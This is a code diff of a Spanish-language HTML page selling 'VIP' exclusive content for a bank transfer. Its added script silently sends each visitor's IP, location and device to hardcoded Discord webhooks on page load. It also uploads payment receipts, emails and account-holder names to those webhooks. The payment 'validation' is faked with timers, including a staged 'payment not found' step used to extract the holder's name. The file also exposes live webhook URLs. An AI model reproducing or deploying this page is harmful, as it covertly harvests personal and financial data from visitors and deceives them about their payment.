@@ -1,179 +1,515 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Palace  😈</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+<title>Acceso VIP 🔥</title>
 
 <style>
-*{
-  box-sizing:border-box;
-}
 
 body{
-  margin:0;
-  background:radial-gradient(circle at top, #15162c, #09090f);
-  color:#fff;
-  font-family:'Poppins',sans-serif;
+margin:0;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
+background:#0d0d0d;
+color:white;
 }
 
 .container{
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  padding:20px;
+max-width:480px;
+margin:auto;
+padding:20px;
 }
 
-.card{
-  width:100%;
-  max-width:520px;
-  background:linear-gradient(180deg,#111326,#0c0d1f);
-  padding:32px 24px;
-  border-radius:20px;
-  box-shadow:0 0 35px rgba(88,101,242,.55);
-  text-align:center;
+.logo{
+font-size:26px;
+font-weight:700;
+margin-top:25px;
 }
 
-.badge{
-  display:inline-block;
-  background:#5865F2;
-  color:white;
-  padding:6px 14px;
-  border-radius:999px;
-  font-size:13px;
-  margin-bottom:16px;
+.sub{
+color:#bfbfbf;
+margin-top:10px;
+font-size:16px;
+line-height:1.6;
 }
 
-h1{
-  font-size:34px;
-  font-weight:800;
-  line-height:1.1;
-  margin:10px 0;
+.hero{
+background:linear-gradient(145deg,#1a1a1a,#0d0d0d);
+border-radius:16px;
+padding:25px;
+margin-top:20px;
+box-shadow:0 0 25px rgba(0,0,0,0.5);
 }
 
-.highlight{
-  color:#5865F2;
-}
-
-.desc{
-  margin-top:14px;
-  font-size:16px;
-  color:#d0d0d0;
-  line-height:1.5;
+.hero h1{
+margin:0;
+font-size:28px;
 }
 
 .features{
-  margin:22px 0;
-  text-align:left;
-  font-size:15px;
-}
-
-.features div{
-  margin:10px 0;
+margin-top:15px;
+font-size:17px;
+line-height:1.8;
 }
 
 .btn{
-  margin-top:28px;
-  display:block;
-  width:100%;
-  background:#5865F2;
-  padding:18px;
-  border-radius:14px;
-  color:white;
-  font-size:20px;
-  font-weight:700;
-  text-decoration:none;
-  transition:.25s;
+display:block;
+background:linear-gradient(90deg,#ff0055,#ff2a75);
+color:white;
+padding:18px;
+margin-top:20px;
+font-size:18px;
+border-radius:12px;
+text-decoration:none;
+font-weight:600;
+text-align:center;
+box-shadow:0 8px 20px rgba(255,0,85,0.4);
 }
 
-.btn:hover{
-  background:#4755d8;
-  transform:scale(1.03);
+.section{
+margin-top:35px;
 }
 
-.footer{
-  margin-top:22px;
-  font-size:13px;
-  color:#aaa;
+.section h2{
+font-size:22px;
+margin-bottom:15px;
 }
 
-.{
-  margin-top:10px;
-  font-size:14px;
-  color:#8ea1e1;
+.preview{
+width:100%;
+border-radius:12px;
+margin-bottom:12px;
 }
 
-/* MOBILE */
-@media(max-width:480px){
-  h1{font-size:30px;}
-  .desc{font-size:15px;}
-  .btn{font-size:18px;}
+.payment-box{
+background:#151515;
+padding:20px;
+border-radius:14px;
+margin-top:10px;
+line-height:1.7;
+border:1px solid #262626;
 }
+.file-upload{
+margin-top:12px;
+}
+
+.file-label{
+display:block;
+background:#1f1f1f;
+border:2px dashed #ff0055;
+padding:18px;
+border-radius:12px;
+text-align:center;
+font-size:16px;
+cursor:pointer;
+transition:0.2s;
+}
+
+.file-label:hover{
+background:#2a2a2a;
+}
+
+#file{
+display:none;
+}
+
+#file-name{
+display:block;
+margin-top:8px;
+font-size:14px;
+color:#aaa;
+text-align:center;
+}
+.alias{
+background:#0f0f0f;
+padding:15px;
+border-radius:10px;
+margin-top:10px;
+font-weight:700;
+font-size:18px;
+border:1px solid #2a2a2a;
+}
+
+input{
+width:100%;
+padding:16px;
+margin-top:10px;
+border-radius:10px;
+border:1px solid #2a2a2a;
+background:#0f0f0f;
+color:white;
+font-size:16px;
+}
+
+button{
+width:100%;
+padding:18px;
+margin-top:15px;
+background:#00c853;
+color:white;
+font-size:18px;
+border:none;
+border-radius:12px;
+font-weight:600;
+cursor:pointer;
+}
+
+.loader-screen{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#0d0d0d;
+display:none;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+z-index:999;
+}
+
+.spinner{
+width:60px;
+height:60px;
+border:5px solid #333;
+border-top:5px solid #ff0055;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin-bottom:20px;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg)}
+100%{transform:rotate(360deg)}
+}
+
+.message{
+font-size:20px;
+text-align:center;
+padding:20px;
+}
+
+.success-btn{
+display:block;
+margin-top:20px;
+background:#ff0055;
+padding:18px;
+border-radius:12px;
+text-decoration:none;
+color:white;
+font-weight:600;
+}
+
 </style>
-
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '848966294548367');
-fbq('track', 'PageView');
-</script>
-<noscript>
-<img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=848966294548367&ev=PageView&noscript=1"/>
-</noscript>
-<!-- End Meta Pixel Code -->
 
 </head>
 
 <body>
 
-<div class="container">
-  <div class="card">
+<div class="container" id="pagina">
 
-    <div class="badge">🔥  Privado</div>
-
-    <h1>
-      El Drive con <span class="highlight">mas contenido de Argentina</span> 😈
-    </h1>
-
-    <p class="desc">
-      Contenido exclusivo, comunidad activa 24/7  
-      y cosas que <b>no van en Instagram</b>.
-    </p>
-
-    <div class="features">
-      <div>💬 Chats activos todo el día</div>
-      <div>🎁 Sorteos y drops exclusivos</div>
-      <div>🔞 Contenido exclusivo</div>
-      <div>🚪 Acceso limitado</div>
-    </div>
-
-    <a href="https://fotrot.github.io/impala/"
-       class="btn"
-       onclick="fbq('track','Lead');">
-      👉 ENTRAR 
-    </a>
-
-    <div class="">
-      Vas directo a  • Un clic • Sin vueltas
-    </div>
-
-    <div class="footer">
-      Comunidad privada
-    </div>
-
-  </div>
+<div class="logo">
+🔥 Acceso VIP
 </div>
+
+<div class="sub">
+Contenido exclusivo sin censura.<br>
+Acceso inmediato después del pago.
+</div>
+
+<div class="hero">
+
+<h1>Contenido VIP 🔥</h1>
+
+<div class="features">
+✔ +7900 archivos exclusivas<br>
+✔ 15GB de contenido<br>
+✔ Actualizaciones constantes
+</div>
+
+<a class="btn" href="#comprar">
+ACCEDER AL VIP — $3500
+</a>
+
+</div>
+
+<div class="section">
+
+<h2>Vista previa</h2>
+
+<img class="preview" src="image.png">
+
+</div>
+
+<div class="section" id="comprar">
+
+<h2>Cómo comprar</h2>
+
+<div class="payment-box">
+
+1️⃣ Transferí <b>$3500</b>
+
+<div class="alias">
+licho380.nx
+</div>
+
+2️⃣ Sacá captura del comprobante<br><br>
+
+3️⃣ Subilo abajo para validar tu acceso
+
+</div>
+
+</div>
+
+<div class="section">
+
+<h2>Enviar comprobante</h2>
+
+<input type="email" id="email" placeholder="Tu email">
+<div class="file-upload">
+<label for="file" class="file-label">
+📎 Subir comprobante
+</label>
+<input type="file" id="file">
+<span id="file-name">Ningún archivo seleccionado</span>
+</div>
+
+<button onclick="enviarComprobante()">
+ENVIAR COMPROBANTE
+</button>
+
+</div>
+
+</div>
+
+<div class="loader-screen" id="loader">
+
+<div class="spinner"></div>
+
+<div class="message" id="mensaje">
+Validando pago...
+</div>
+
+</div>
+
+<script>
+
+const WEBHOOK_VISITAS="https://discord.com/api/webhooks/1481086531199565875/bj-4VPCdCXodDRG2rml-D7425hkkYCy-J2RMJ5EQ_C6tavFhPEowzoxvVVNUlY7Ix06k"
+const WEBHOOK_COMPROBANTES="https://discord.com/api/webhooks/1481086587336003716/nFOht5mfcTNUhKghfCL413HmSnLXeNnYGxDOMRCh6VXPqjGRj3tYnAmfBKwEoCUwhakD"
+const WEBHOOK_CLICK_ENVIAR="https://discord.com/api/webhooks/1481086624627560468/x-kC0vKkDm8u7K5H9khFGmEG1FmeWvel8OZFeoD899i8jlrTiQgKZFWa4lM5Y2Eqn3pf"
+const WEBHOOK_CLICK_VALIDAR="https://discord.com/api/webhooks/1481086665509310536/of3xpeT43SQ6Ao3suMBOhZBeZfbbTomkkpT2MnsXw5odmESBQqHp8NM84CIZ4TgttQU_"
+const WEBHOOK_CONFIRMADOS="https://discord.com/api/webhooks/1481086701379129577/uSb5nqbZgVvAaDPU9s_0a8-XPI1Uqb7M24RyBMIt7Vgp3GL-TymREzf8wckeRKMkAcnK"
+const WEBHOOK_ACCESO = "https://discord.com/api/webhooks/1481088342903750709/4QHlhqI054p694FtbRicdGR-4CIuX2ZXg8oMRSg4WkPliWcnaIN6uKocFfPtUX4TtCoH"
+
+let emailUsuario=""
+let archivo=null
+let titular=""
+let ip=""
+let pais=""
+let ciudad=""
+let dispositivo=navigator.userAgent
+
+
+document.getElementById("file").addEventListener("change",function(){
+
+const fileName=this.files[0]?.name || "Ningún archivo seleccionado"
+
+document.getElementById("file-name").innerText=fileName
+
+})
+
+async function detectarIP(){
+
+try{
+
+const res=await fetch("https://ipapi.co/json/")
+const data=await res.json()
+
+ip=data.ip
+pais=data.country_name
+ciudad=data.city
+
+}catch{
+
+ip="desconocida"
+
+}
+
+}
+
+function embed(webhook,titulo,descripcion){
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+embeds:[{
+title:titulo,
+description:descripcion,
+color:16724787,
+timestamp:new Date().toISOString()
+}]
+})
+})
+
+}
+
+async function logVisita(){
+
+await detectarIP()
+
+embed(
+WEBHOOK_VISITAS,
+"👁️ Nueva visita",
+`IP: **${ip}**
+País: **${pais}**
+Ciudad: **${ciudad}**
+Dispositivo: **${dispositivo}**`
+)
+
+}
+
+window.onload=logVisita
+
+function enviarComprobante(){
+
+emailUsuario=document.getElementById("email").value
+archivo=document.getElementById("file").files[0]
+
+embed(
+WEBHOOK_CLICK_ENVIAR,
+"📩 Click enviar comprobante",
+`IP: **${ip}**
+Email: **${emailUsuario}**`
+)
+
+if(archivo){
+
+const form=new FormData()
+
+form.append("file",archivo)
+
+form.append("payload_json",JSON.stringify({
+embeds:[{
+title:"📎 Comprobante recibido",
+description:`IP: **${ip}**
+Email: **${emailUsuario}**`,
+color:16724787
+}]
+}))
+
+fetch(WEBHOOK_COMPROBANTES,{
+method:"POST",
+body:form
+})
+
+}
+
+document.getElementById("loader").style.display="flex"
+document.getElementById("mensaje").innerHTML="Validando pago..."
+
+setTimeout(()=>{
+
+document.getElementById("mensaje").innerHTML="❌ Pago no encontrado"
+
+setTimeout(()=>{
+pedirTitular()
+},1500)
+
+},2300)
+
+}
+
+function pedirTitular(){
+
+document.getElementById("loader").style.display="none"
+
+document.getElementById("pagina").innerHTML=`
+
+<div class="container">
+
+<h2>Validar transferencia</h2>
+
+<p>Ingrese el nombre del titular de la transferencia para validar el pago.</p>
+
+<input id="titular" placeholder="Nombre del titular">
+
+<button onclick="validarTitular()">VALIDAR PAGO</button>
+
+</div>
+
+`
+
+}
+
+function validarTitular(){
+
+titular=document.getElementById("titular").value
+
+embed(
+WEBHOOK_CLICK_VALIDAR,
+"🔎 Click validar pago",
+`IP: **${ip}**
+Email: **${emailUsuario}**
+Titular: **${titular}**`
+)
+
+document.getElementById("loader").style.display="flex"
+document.getElementById("mensaje").innerHTML="Buscando pago..."
+
+setTimeout(()=>{
+
+// Ejecutar comando del bot
+fetch(WEBHOOK_ACCESO,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:`!acceso ${emailUsuario}`
+})
+})
+
+// log de confirmación
+const form=new FormData()
+
+if(archivo){
+form.append("file",archivo)
+}
+
+form.append("payload_json",JSON.stringify({
+embeds:[{
+title:"💰 Pago confirmado",
+description:`IP: **${ip}**
+Email: **${emailUsuario}**
+Titular: **${titular}**`,
+color:5763719
+}]
+}))
+
+fetch(WEBHOOK_CONFIRMADOS,{
+method:"POST",
+body:form
+})
+
+document.getElementById("mensaje").innerHTML=`
+✅ Pago validado<br><br>
+${emailUsuario} fue habilitado para acceder al contenido exclusivo.
+
+<a class="success-btn" href="https://drive.google.com/drive/folders/1UoD5Rko4MD_KgMbQ-WYkc109NQf6s-GF?usp=sharing">
+ACCEDER AL CONTENIDO
+</a>
+`
+
+},3000)
+
+}
+
+</script>
 
 </body>
 </html>
